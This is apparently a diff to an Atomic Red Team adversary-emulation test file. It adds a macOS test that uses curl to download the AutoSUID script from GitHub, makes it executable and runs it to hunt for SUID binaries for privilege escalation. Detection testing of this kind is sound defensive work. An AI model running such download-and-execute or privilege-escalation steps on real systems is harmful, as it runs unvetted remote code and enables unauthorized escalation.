@@ -38,3 +38,25 @@ atomic_tests:
     cleanup_command: |
       rm /tmp/art-fish.txt
     name: sh
+- name: Harvest SUID executable files
+  auto_generated_guid: 96345bfc-8ae7-4b6a-80b7-223200f24ef9
+  description: |
+    AutoSUID application is the Open-Source project, the main idea of which is to automate harvesting the SUID executable files and to find a way for further escalating the privileges. 
+  supported_platforms:
+  - macos 
+  input_arguments:
+    autosuid:
+      description: Path to the autosuid shell script
+      type: Path
+      default: PathToAtomicsFolder/T1059.004/src/AutoSUID.sh
+    autosuid_url:
+      description: Path to download autosuid shell script
+      type: Url
+      default: https://raw.githubusercontent.com/IvanGlinkin/AutoSUID/main/AutoSUID.sh
+  executor:
+    command: |
+      curl #{autosuid_url} --output #{autosuid}
+      chmod +x #{autosuid}
+      bash #{autosuid}
+    name: bash
+    
